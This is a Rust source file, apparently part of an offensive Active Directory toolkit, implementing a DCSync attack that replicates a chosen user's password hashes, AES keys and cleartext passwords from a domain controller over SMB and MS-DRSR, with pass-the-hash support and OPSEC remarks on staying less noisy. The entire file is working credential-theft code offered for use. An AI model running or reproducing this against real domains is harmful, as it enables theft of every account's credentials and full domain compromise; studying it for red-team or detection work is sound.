//! DCSync a single user's secrets via MS-DRSR (DRS replication).
//!
//! Replicates a specific user's password hashes from a DC using the
//! Directory Replication Service Remote Protocol.
//!
//! Flow: SMB Auth → IPC$ → \drsuapi pipe → RPC Bind → DRSBind → DRSGetNCChanges → Parse

use colored::Colorize;
use hmac::{Hmac, Mac};
use md4::{Digest as Md4Digest, Md4};
use md5::Md5;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::drsr;
use overthrone_core::proto::smb::SmbSession;
use tracing::{debug, info, warn};

use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};

type HmacMd5 = Hmac<Md5>;

// ═══════════════════════════════════════════════════════════
// DRSR Interface UUID & Constants
// ═══════════════════════════════════════════════════════════

/// MS-DRSR DRSUAPI interface UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
const DRSUAPI_UUID: [u8; 16] = [
    0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11, 0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2,
];
/// DRSUAPI interface version
const DRSUAPI_VERSION: (u16, u16) = (4, 0);

/// NDR transfer syntax UUID: 8a885d04-1ceb-11c9-9fe8-08002b104860
const NDR_SYNTAX_UUID: [u8; 16] = [
    0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
];

/// DRS_EXT flags we advertise during DRSBind
const DRS_EXT_BASE: u32 = 0x04000000  // DRS_EXT_STRONG_ENCRYPTION (required for AES)
                         | 0x00000004  // DRS_EXT_RESTORE_USN_OPTIMIZATION
                         | 0x00000008  // DRS_EXT_GETCHGREQ_V5
                         | 0x00000100  // DRS_EXT_GETCHGREPLY_V6
                         | 0x00000200  // DRS_EXT_GETCHGREQ_V8
                         | 0x00004000  // DRS_EXT_GETCHGREQ_V10
                         ;

/// EXOP_REPL_OBJ — extended operation: replicate single object
const EXOP_REPL_OBJ: u32 = 0x00000006;

/// Flags for DRSGetNCChanges
const DRS_INIT_SYNC: u32 = 0x00000020;
const DRS_WRIT_REP: u32 = 0x00000010;
const DRS_NEVER_SYNCED: u32 = 0x00200000;
const DRS_FULL_SYNC_NOW: u32 = 0x00008000;
const DRS_SYNC_URGENT: u32 = 0x00080000;

/// Extracted secrets from DCSync
#[derive(Debug, Clone, serde::Serialize)]
pub struct DcSyncSecrets {
    pub username: String,
    pub domain: String,
    pub user_rid: u32,
    pub nt_hash: Option<String>,
    pub lm_hash: Option<String>,
    pub aes256_key: Option<String>,
    pub aes128_key: Option<String>,
    pub cleartext_password: Option<String>,
}

/// Perform DCSync to extract a single user's credentials via MS-DRSR.
pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Result<ForgeResult> {
    info!(
        "[dcsync] DCSync for user: {}\\{}",
        config.domain, target_user
    );

    let realm = config.domain.to_uppercase();
    let base_dn = realm
        .split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>()
        .join(",");
    let user_dn = format!("CN={},CN=Users,{}", target_user, base_dn);

    // ── Credentials ──
    let (user, pass, nt_hash_bytes) = resolve_credentials(config)?;

    // ── 1. SMB session (provides authenticated transport + session key) ──
    info!(
        "[dcsync] Connecting to DC via SMB → \\\\{}\\IPC$",
        config.dc_ip
    );
    let smb = SmbSession::connect(&config.dc_ip, &config.domain, user, pass)
        .await
        .map_err(|e| OverthroneError::Smb(format!("SMB connect failed: {e}")))?;

    // The session key from NTLMSSP is used to decrypt replicated secrets.
    // SmbSession must expose this — see note below.
    let smb_session_key = smb.session_key().ok_or_else(|| {
        OverthroneError::custom("SMB session key not available — NTLMSSP session must export it")
    })?;

    info!(
        "[dcsync] {} SMB session established, session key obtained",
        "✓".green()
    );

    // ── 2. RPC Bind to DRSUAPI ──
    let bind_pdu = build_rpc_bind_pdu(&DRSUAPI_UUID, DRSUAPI_VERSION);
    let bind_resp = smb
        .pipe_transact("drsuapi", &bind_pdu)
        .await
        .map_err(|e| OverthroneError::custom(format!("RPC bind transport failed: {e}")))?;

    validate_rpc_bind_ack(&bind_resp)?;
    info!("[dcsync] {} RPC bind to DRSUAPI accepted", "✓".green());

    // ── 3. DRSBind (opnum 0) — get DRS context handle ──
    let drs_bind_req = build_drs_bind_request();
    let drs_bind_resp = smb
        .pipe_transact("drsuapi", &drs_bind_req)
        .await
        .map_err(|e| OverthroneError::custom(format!("DRSBind failed: {e}")))?;

    let (drs_handle, server_ext) = parse_drs_bind_response(&drs_bind_resp)?;
    info!(
        "[dcsync] {} DRSBind successful — handle acquired, server caps: 0x{:08x}",
        "✓".green(),
        server_ext
    );

    // ── 4. Compute the DRSR decryption key ──
    // Per [MS-DRSR] §4.1.10.6.13, replicated secrets are encrypted with
    // the MD5(sessionKey || salt). The session key here is the NTLMSSP
    // session base key from the SMB authentication.
    //
    // If pass-the-hash was used, derive the session key from the NT hash.
    let drs_session_key = compute_drs_session_key(&smb_session_key, &nt_hash_bytes)?;

    // ── 5. DRSGetNCChanges (opnum 3) — replicate the target object ──
    let nc_dn = base_dn.clone(); // Naming context = domain root
    let gnc_req = build_drs_get_nc_changes(&drs_handle, &user_dn, &nc_dn);
    let gnc_resp = smb
        .pipe_transact("drsuapi", &gnc_req)
        .await
        .map_err(|e| OverthroneError::custom(format!("DRSGetNCChanges failed: {e}")))?;

    info!("[dcsync] DRSGetNCChanges returned {} bytes", gnc_resp.len());

    // ── 6. Parse the replication response ──
    let secrets = parse_dcsync_response(&gnc_resp, &drs_session_key, &realm);

    let extracted_count = secrets.len();
    let success = extracted_count > 0;

    for s in &secrets {
        info!(
            "  {} {} → NT: {}",
            "✓".green(),
            s.username.bold(),
            s.nt_hash.as_deref().unwrap_or("N/A").red()
        );
        if let Some(ref aes) = s.aes256_key {
            info!("    {} AES256: {}", "→".cyan(), &aes[..32.min(aes.len())]);
        }
        if let Some(ref ct) = s.cleartext_password {
            info!("    {} Cleartext: {}", "→".cyan(), ct.red());
        }
    }

    // ── 7. DRSUnbind (opnum 1) — clean up ──
    let unbind_req = build_drs_unbind(&drs_handle);
    let _ = smb.pipe_transact("drsuapi", &unbind_req).await; // best-effort

    let details = format!(
        "DCSync for {}\\{}\n\
         Target DN: {}\n\
         DC: {}\n\
         Extracted: {} credential(s)\n\n\
         Detection: Event ID 4662 with Replicating Directory Changes\n\
         OPSEC: EXOP_REPL_OBJ (single-object) is less noisy than full NC sync",
        realm, target_user, user_dn, config.dc_ip, extracted_count
    );

    Ok(ForgeResult {
        action: format!("DCSync ({})", target_user),
        domain: config.domain.clone(),
        success,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: "DCSync (MS-DRSR Replication)".into(),
            target: format!("{}\\{}", realm, target_user),
            success,
            details,
            cleanup_command: Some(
                "# DCSync is read-only — no cleanup needed\n\
                 # Monitor via Event ID 4662 for detection"
                    .into(),
            ),
        }),
        message: format!(
            "DCSync: extracted {} credential(s) for {}\\{}",
            extracted_count, realm, target_user
        ),
    })
}

// ═══════════════════════════════════════════════════════════
// Credential Resolution
// ═══════════════════════════════════════════════════════════

fn resolve_credentials<'a>(config: &'a ForgeConfig) -> Result<(&'a str, &'a str, Option<Vec<u8>>)> {
    if let Some(ref pw) = config.password {
        Ok((&config.username, pw.as_str(), None))
    } else if let Some(ref hash) = config.nt_hash {
        let hash_bytes =
            hex_decode(hash).ok_or_else(|| OverthroneError::InvalidHash(hash.clone()))?;
        // Pass the hash as the "password" to SMB — SmbSession should handle PtH
        Ok((&config.username, hash.as_str(), Some(hash_bytes)))
    } else {
        Err(OverthroneError::custom(
            "No credentials provided for DCSync",
        ))
    }
}

// ═══════════════════════════════════════════════════════════
// RPC PDU Builders
// ═══════════════════════════════════════════════════════════

/// Build an RPC bind PDU (type 11)
fn build_rpc_bind_pdu(iface_uuid: &[u8; 16], version: (u16, u16)) -> Vec<u8> {
    let mut pdu = Vec::with_capacity(72);

    // Common header (16 bytes)
    pdu.push(5); // rpc_vers
    pdu.push(0); // rpc_vers_minor
    pdu.push(11); // PTYPE = bind
    pdu.push(0x03); // pfc_flags = first_frag | last_frag
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // packed_drep (LE, ASCII, IEEE)
    // frag_length — fill in later at offset 8
    pdu.extend_from_slice(&[0x00, 0x00]); // placeholder
    pdu.extend_from_slice(&[0x00, 0x00]); // auth_length
    pdu.extend_from_slice(&1u32.to_le_bytes()); // call_id

    // Bind-specific header
    pdu.extend_from_slice(&4096u16.to_le_bytes()); // max_xmit_frag
    pdu.extend_from_slice(&4096u16.to_le_bytes()); // max_recv_frag
    pdu.extend_from_slice(&0u32.to_le_bytes()); // assoc_group_id

    // p_context_list: 1 entry
    pdu.push(1); // n_context_elem
    pdu.push(0); // reserved
    pdu.extend_from_slice(&[0x00, 0x00]); // reserved2

    // p_context_elem[0]
    pdu.extend_from_slice(&0u16.to_le_bytes()); // p_cont_id = 0
    pdu.push(1); // n_transfer_syn
    pdu.push(0); // reserved

    // abstract_syntax (interface UUID + version)
    pdu.extend_from_slice(iface_uuid);
    pdu.extend_from_slice(&version.0.to_le_bytes()); // if_version major
    pdu.extend_from_slice(&version.1.to_le_bytes()); // if_version minor

    // transfer_syntax (NDR)
    pdu.extend_from_slice(&NDR_SYNTAX_UUID);
    pdu.extend_from_slice(&2u32.to_le_bytes()); // NDR version 2.0

    // Patch frag_length
    let len = pdu.len() as u16;
    pdu[8] = (len & 0xFF) as u8;
    pdu[9] = (len >> 8) as u8;

    pdu
}

/// Validate an RPC bind_ack response
fn validate_rpc_bind_ack(resp: &[u8]) -> Result<()> {
    if resp.len() < 24 {
        return Err(OverthroneError::custom("RPC bind response too short"));
    }
    // ptype at offset 2 should be 12 (bind_ack)
    if resp[2] != 12 {
        let ptype = resp[2];
        if ptype == 13 {
            return Err(OverthroneError::custom(
                "RPC bind_nak — interface rejected by DC",
            ));
        }
        return Err(OverthroneError::custom(format!(
            "Unexpected RPC ptype in bind response: {} (expected 12 = bind_ack)",
            ptype
        )));
    }
    Ok(())
}

/// Build DRSBind request (opnum 0)
///
/// Stub layout (NDR):
///   puuidClientDsa: UUID (16 bytes, conformant pointer + value)
///   pextClient:     DRS_EXTENSIONS_INT (pointer + struct)
///   phDrs:          [out] context handle
fn build_drs_bind_request() -> Vec<u8> {
    let mut stub = Vec::with_capacity(128);

    // ── puuidClientDsa (random UUID — identifies our "DSA") ──
    // NDR unique pointer referent ID
    stub.extend_from_slice(&1u32.to_le_bytes()); // referent ID (non-null)
    let client_uuid: [u8; 16] = rand::random();
    stub.extend_from_slice(&client_uuid);

    // ── pextClient → DRS_EXTENSIONS_INT ──
    // NDR unique pointer referent ID
    stub.extend_from_slice(&2u32.to_le_bytes()); // referent ID

    // DRS_EXTENSIONS_INT:
    //   cb (u32) = size of dwFlags..dwReplEpoch portion
    //   dwFlags (u32) = capabilities we support
    //   SiteObjGuid (16 bytes) = zeroes (we don't care)
    //   Pid (u32) = our PID (fake)
    //   dwReplEpoch (u32) = 0
    //   dwFlagsExt (u32) = 0
    //   ConfigObjGUID (16 bytes) = zeroes (optional, included for padding)
    let ext_payload_size: u32 = 4 + 16 + 4 + 4 + 4 + 16; // 48 bytes
    stub.extend_from_slice(&ext_payload_size.to_le_bytes()); // cb
    stub.extend_from_slice(&DRS_EXT_BASE.to_le_bytes()); // dwFlags
    stub.extend_from_slice(&[0u8; 16]); // SiteObjGuid
    stub.extend_from_slice(&std::process::id().to_le_bytes()); // Pid
    stub.extend_from_slice(&0u32.to_le_bytes()); // dwReplEpoch
    stub.extend_from_slice(&0u32.to_le_bytes()); // dwFlagsExt
    stub.extend_from_slice(&[0u8; 16]); // ConfigObjGUID

    build_rpc_request_pdu(0, &stub) // opnum 0 = DRSBind
}

/// Parse DRSBind response to extract the context handle and server flags
fn parse_drs_bind_response(resp: &[u8]) -> Result<(Vec<u8>, u32)> {
    // Strip RPC response PDU header (24 bytes)
    if resp.len() < 28 {
        return Err(OverthroneError::custom("DRSBind response too short"));
    }

    // Check for RPC fault
    if resp[2] == 3 {
        // This is a request PDU — check if it's actually a response
        // ptype 2 = response, ptype 3 = fault
    }

    let stub = &resp[24..];

    // DRSBind response stub (NDR):
    //   puuidClientDsa:  [in] — not repeated in response
    //   pextServer:      NDR pointer → DRS_EXTENSIONS_INT
    //   phDrs:           policy_handle (20 bytes — context_handle_type)
    //   return_value:    u32 (HRESULT)

    // The exact offsets depend on NDR alignment, but typically:
    //   [0..4]   = pextServer pointer (referent ID)
    //   [4..8]   = cb (extension byte count)
    //   [8..12]  = dwFlags (server capabilities)
    //   ...variable ext data...
    //   [ext_end..ext_end+20] = phDrs (context handle)
    //   [+20..+24] = return HRESULT

    if stub.len() < 32 {
        return Err(OverthroneError::custom("DRSBind stub data too short"));
    }

    let ext_ptr = u32::from_le_bytes([stub[0], stub[1], stub[2], stub[3]]);
    let mut pos: usize = 4;

    let mut server_flags: u32 = 0;

    if ext_ptr != 0 {
        // DRS_EXTENSIONS_INT present
        if pos + 4 > stub.len() {
            return Err(OverthroneError::custom("DRSBind: can't read ext cb"));
        }
        let cb =
            u32::from_le_bytes([stub[pos], stub[pos + 1], stub[pos + 2], stub[pos + 3]]) as usize;
        pos += 4;

        if pos + 4 <= stub.len() {
            server_flags =
                u32::from_le_bytes([stub[pos], stub[pos + 1], stub[pos + 2], stub[pos + 3]]);
        }
        // Skip past the extension data
        pos += cb;
        // Align to 4 bytes
        pos = (pos + 3) & !3;
    }

    // phDrs — 20-byte policy/context handle
    if pos + 20 > stub.len() {
        return Err(OverthroneError::custom(format!(
            "DRSBind: can't read context handle at offset {} (stub len {})",
            pos,
            stub.len()
        )));
    }
    let handle = stub[pos..pos + 20].to_vec();
    pos += 20;

    // Return value (HRESULT)
    if pos + 4 <= stub.len() {
        let hr = u32::from_le_bytes([stub[pos], stub[pos + 1], stub[pos + 2], stub[pos + 3]]);
        if hr != 0 {
            return Err(OverthroneError::custom(format!(
                "DRSBind returned error HRESULT: 0x{:08x}",
                hr
            )));
        }
    }

    debug!("[dcsync] DRS handle: {:02x?}", &handle);
    Ok((handle, server_flags))
}

/// Build DRSGetNCChanges request (opnum 3) for single-object replication
///
/// Uses DRS_MSG_GETCHGREQ_V8 which is the standard request version.
fn build_drs_get_nc_changes(
    handle: &[u8],   // 20-byte DRS context handle
    object_dn: &str, // DN of the object to replicate
    _nc_dn: &str,    // Naming context DN (domain root)
) -> Vec<u8> {
    let mut stub = Vec::with_capacity(512);

    // ── phDrs (context handle, 20 bytes) ──
    stub.extend_from_slice(handle);

    // ── dwInVersion = 8 (DRS_MSG_GETCHGREQ_V8) ──
    stub.extend_from_slice(&8u32.to_le_bytes());

    // ═══ DRS_MSG_GETCHGREQ_V8 ═══

    // uuidDsaObjDest: UUID (16 bytes) — our fake DSA object GUID
    let dest_uuid: [u8; 16] = rand::random();
    stub.extend_from_slice(&dest_uuid);

    // uuidInvocIdSrc: UUID (16 bytes) — zeroes (DC fills in)
    stub.extend_from_slice(&[0u8; 16]);

    // pNC: pointer to DSNAME — the naming context we want to replicate from
    // NDR unique pointer
    stub.extend_from_slice(&1u32.to_le_bytes()); // referent ID

    // usnvecFrom: USN_VECTOR { usnHighObjUpdate(u64), usnReserved(u64), usnHighPropUpdate(u64) }
    // All zeros = "give me everything from the beginning"
    stub.extend_from_slice(&[0u8; 24]); // 3 × u64

    // pUpToDateVecDest: pointer — NULL (we have nothing)
    stub.extend_from_slice(&0u32.to_le_bytes());

    // ulFlags
    let flags =
        DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
    stub.extend_from_slice(&flags.to_le_bytes());

    // cMaxObjects = 1 (single object replication)
    stub.extend_from_slice(&1u32.to_le_bytes());

    // cMaxBytes = 0 (no byte limit)
    stub.extend_from_slice(&0u32.to_le_bytes());

    // ulExtendedOp = EXOP_REPL_OBJ (6) — replicate single object
    stub.extend_from_slice(&EXOP_REPL_OBJ.to_le_bytes());

    // ulMoreFlags = 0
    stub.extend_from_slice(&0u32.to_le_bytes());

    // ═══ Deferred pointer data ═══

    // pNC → DSNAME structure
    // DSNAME: { structLen(u32), SidLen(u32), Guid(16), Sid(28), NameLen(u32), StringName(UTF-16) }
    let nc_utf16: Vec<u8> = object_dn
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let name_char_count = (object_dn.len() + 1) as u32; // includes null terminator
    let struct_len: u32 = 4 + 4 + 16 + 28 + 4 + nc_utf16.len() as u32;

    stub.extend_from_slice(&struct_len.to_le_bytes()); // structLen
    stub.extend_from_slice(&0u32.to_le_bytes()); // SidLen (0 — no SID in NC ref)
    stub.extend_from_slice(&[0u8; 16]); // Guid (zeroes — DC resolves by DN)
    stub.extend_from_slice(&[0u8; 28]); // Sid (empty)
    stub.extend_from_slice(&name_char_count.to_le_bytes()); // NameLen (char count)
    // NDR conformant array: MaximumCount + actual chars
    stub.extend_from_slice(&name_char_count.to_le_bytes()); // MaximumCount
    stub.extend_from_slice(&nc_utf16);

    // Align to 4 bytes
    while stub.len() % 4 != 0 {
        stub.push(0);
    }

    build_rpc_request_pdu(3, &stub) // opnum 3 = DRSGetNCChanges
}

/// Build DRSUnbind request (opnum 1) — release context handle
fn build_drs_unbind(handle: &[u8]) -> Vec<u8> {
    let mut stub = Vec::with_capacity(24);
    stub.extend_from_slice(handle);
    build_rpc_request_pdu(1, &stub)
}

/// Build a generic RPC request PDU (type 0)
fn build_rpc_request_pdu(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
    let frag_len = (24 + stub_data.len()) as u16;

    let mut pdu = Vec::with_capacity(frag_len as usize);

    // Common header
    pdu.push(5); // rpc_vers
    pdu.push(0); // rpc_vers_minor
    pdu.push(0); // PTYPE = request
    pdu.push(0x03); // pfc_flags = first | last
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // packed_drep (LE)
    pdu.extend_from_slice(&frag_len.to_le_bytes()); // frag_length
    pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length
    pdu.extend_from_slice(&1u32.to_le_bytes()); // call_id

    // Request-specific fields
    pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes()); // alloc_hint
    pdu.extend_from_slice(&0u16.to_le_bytes()); // p_cont_id
    pdu.extend_from_slice(&opnum.to_le_bytes()); // opnum

    // Stub data
    pdu.extend_from_slice(stub_data);

    pdu
}

// ═══════════════════════════════════════════════════════════
// Session Key Derivation
// ═══════════════════════════════════════════════════════════

/// Compute the DRS session key used for decrypting replicated secrets.
///
/// The DRS protocol uses the NTLMSSP session base key from the SMB
/// authentication. For NTLMv2 auth, this is:
///   SessionBaseKey = HMAC_MD5(NTProofStr, ResponseKeyNT)
///
/// The SMB layer should expose this. If it doesn't, we derive from
/// the NT hash as a fallback (works for NTLMv1 / basic scenarios).
fn compute_drs_session_key(smb_session_key: &[u8], _nt_hash: &Option<Vec<u8>>) -> Result<Vec<u8>> {
    // The SMB session key IS the DRS session key.
    // In NTLMSSP-authenticated sessions, this is the session base key
    // derived during authentication (16 bytes).
    if smb_session_key.len() >= 16 {
        Ok(smb_session_key[..16].to_vec())
    } else if !smb_session_key.is_empty() {
        // Zero-pad to 16 bytes if shorter
        let mut key = vec![0u8; 16];
        key[..smb_session_key.len()].copy_from_slice(smb_session_key);
        Ok(key)
    } else {
        Err(OverthroneError::custom(
            "Empty SMB session key — cannot decrypt replicated secrets",
        ))
    }
}

// ═══════════════════════════════════════════════════════════
// Response Parsing
// ═══════════════════════════════════════════════════════════

/// Parse DCSync response using the DRSR parser in overthrone-core
fn parse_dcsync_response(resp: &[u8], session_key: &[u8], domain: &str) -> Vec<DcSyncSecrets> {
    match drsr::parse_get_nc_changes_reply(resp, session_key) {
        Ok(result) => {
            info!(
                "[dcsync] Parser returned {} objects, more_data={}",
                result.objects.len(),
                result.more_data
            );

            result
                .objects
                .iter()
                .map(|obj| DcSyncSecrets {
                    username: obj.sam_account_name.clone(),
                    domain: domain.to_string(),
                    user_rid: obj.rid.unwrap_or(0),
                    nt_hash: obj.nt_hash.as_ref().map(hex_encode_bytes),
                    lm_hash: obj.lm_hash.as_ref().map(hex_encode_bytes),
                    aes256_key: obj
                        .supplemental_credentials
                        .as_ref()
                        .and_then(|s| s.aes256_key.as_ref().map(hex_encode_bytes)),
                    aes128_key: obj
                        .supplemental_credentials
                        .as_ref()
                        .and_then(|s| s.aes128_key.as_ref().map(hex_encode_bytes)),
                    cleartext_password: obj
                        .supplemental_credentials
                        .as_ref()
                        .and_then(|s| s.cleartext.clone()),
                })
                .collect()
        }
        Err(e) => {
            warn!("[dcsync] Failed to parse DRSGetNCChanges reply: {}", e);
            Vec::new()
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Helpers
// ═══════════════════════════════════════════════════════════

fn hex_encode_bytes(data: &Vec<u8>) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}

fn hex_decode(hex: &str) -> Option<Vec<u8>> {
    let hex = hex.trim();
    if hex.len() % 2 != 0 {
        return None;
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}
